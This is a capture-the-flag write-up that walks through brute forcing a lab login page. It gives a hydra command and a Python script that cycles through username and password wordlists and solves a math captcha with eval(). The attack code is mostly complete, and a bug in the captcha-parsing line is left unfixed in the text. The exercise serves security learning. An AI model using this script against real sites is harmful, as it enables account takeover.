# 🔐 Brute Force Authentication Explained (Step-by-Step) 💥 - Freddy
![Screenshot From 2025-04-20 23-45-23](https://github.com/user-attachments/assets/d813f427-df49-4b54-976b-f774d1932408)


My first initial thought as soon as I unziped the zip file was its definetly a brute force attack. So I ran the bellow script:

```
sudo hydra -L usernames.txt -P passwords.txt 10.10.139.225 http-post-form
"/login:username=^USER^&password=^PASS^:Error" -v -t 40
```

![Screenshot From 2025-04-21 00-24-17](https://github.com/user-attachments/assets/cd0d1c9c-5492-4d17-b022-c16a09199147)

I was not prepared to wait. I reloaded the website. It presented me with this:

![Screenshot From 2025-04-21 00-28-31](https://github.com/user-attachments/assets/2716ac86-6bb7-4026-90e7-9c1320655a83)


This script tries to brute force login by using the username & password combos to break into a login page that also has a simple math captcha. Here's what it does 👇

---

## 1️⃣ Load Wordlists and the URL

📂 The room provides with a zip file with the users and the passwords txt to brute force with:
- `usernames.txt` ➝ A list of usernames to try
- `passwords.txt` ➝ A list of passwords to try

```
url = 'http://10.10.139.225/login'
usernames = open('usernames.txt', 'r')
passwords = open('passwords.txt', 'r') 
```

Each line is read one at a time.

---

## 2️⃣ Try Every Username

🔁 For each username:
- Clean it up (remove the newline `\n`)
- Go back to the start of the password list (so you can try all passwords again)

```
for username in usernames:
  username = username.strip('\n')
  passwords.seek(0)
```

---

## 3️⃣ Try Every Password

🔁 For each password:
- Also clean it up (remove the newline)
```
for password in passwords:
    password = password.strip('\n')
```

---

## 4️⃣ Solve the Captcha 🤔➕➖✖️

💡 Before sending login data:
- The script **requests the login page**
- It **reads the HTML**
- It finds the **math captcha** (e.g. "5 + 9 =")
- It **solves** the math using Python's `eval()` function

```
session = requests.Session()
    response = session.get(url)
    data = {'username': username,
            'password': password}
    response = session.post(url, data = data)
    soup = BeautifulSoup(response.text, 'html.parser')
    captcha_equation = soup.select_one('label[for="usr"]) + br').next_sibling.strip
    result = eval(captcha_equation.split("=")[0])
```
---

## 5️⃣ Send the Login Attempt 🚀

📝 It builds a form like this:

```
data = {'username': username,
            'password': password,
            'captcha': result}
response = session.post(url, data=data)
```
---

## 6️⃣ Output to the console and to log it✍️ 

```
print("[*] Attempting Password: %s for User: %s" % (password, username))
    if 'does not exist' not in response.text:
        print("[*]Username: %s is valid" % username)

        if 'Invalid password' not in response.text:
            print("[*]Password: %s is correct"% password)
            log = open('logs.txt', 'w')
            log.write(username +" "+ password)
            exit()
        else:
            print("[*]The Password is invalid")
    else:
      break
```
## 7️⃣ Finally found the username and password

![Screenshot From 2025-04-21 03-08-07](https://github.com/user-attachments/assets/3bf8fbe7-a355-4b1e-bb90-d4769b3d762c)


A small syntax error on the code but have corrected it.

## 8️⃣ Captured the flag successfully
![Screenshot From 2025-04-21 03-15-13](https://github.com/user-attachments/assets/f1096bb3-d6bf-462c-abfc-6472d5621ef1)

